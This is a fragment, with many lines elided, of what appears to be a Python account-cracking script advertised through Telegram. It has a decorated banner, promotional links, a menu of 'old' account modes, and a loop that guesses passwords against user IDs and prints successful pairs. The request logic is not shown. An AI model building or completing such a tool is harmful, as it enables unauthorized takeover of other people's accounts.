...
sys.stdout.write('\x1b]2; ⏤͟͟͞͞ ⍣⃝😈🔖𝙔𝙤𝙪𝙣𝙞𝙨𝙓𝙮𝙯 𝙏𝙝𝙚 𝙊𝙣𝙚 𝙈𝙚𝙣 𝘼𝙧𝙢𝙮🔥🫀🧠⍣⃝😈 ͟͞⏤ 𝐙𝐈𝐃𝐃𝐈\x07')
os.system('espeak -v bn+f3 -a 120 -p 40 -s 100 "এই Script টা দিছে কল্যান ভাই গিভ Kalyan king on fire"')
...
os.system('xdg-open https://t.me/Younis_Xyz')
...
\033[1;90m{15 * '⎯⎯⎯'}
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m SC SEND   \033[1;90m➤\033[1;97m  KALYAN KING
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m WhatsApp    \033[1;90m➤\033[1;97m  +923194999455
\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Tool        \033[1;90m➤\033[1;97m  OLD FREE 🔥
\x1b[1;90m{15 * '⎯⎯⎯'}''')
...
def WEHSHI________():
    ...
    if option == "1":os.system('xdg-open https://t.me/KGF_WORLD_CYBER');__2010___2011()
    elif option == "2":os.system('xdg-open https://t.me/KGF_WORLD_CYBER');____old2009___()
    elif option == "3":os.system('xdg-open https://t.me/KGF_WORLD_CYBER');_____old2011_____()
    else:
    ...
    try:
        for ps in pas:
            ...
            if "Please Confirm Email" in str(po):
                print(f"\r\033[1;92m[YOUNIS-OK💚] {uid} ● {ps}\033[1;97m ● \033[1;92m{creationyear(uid)}")
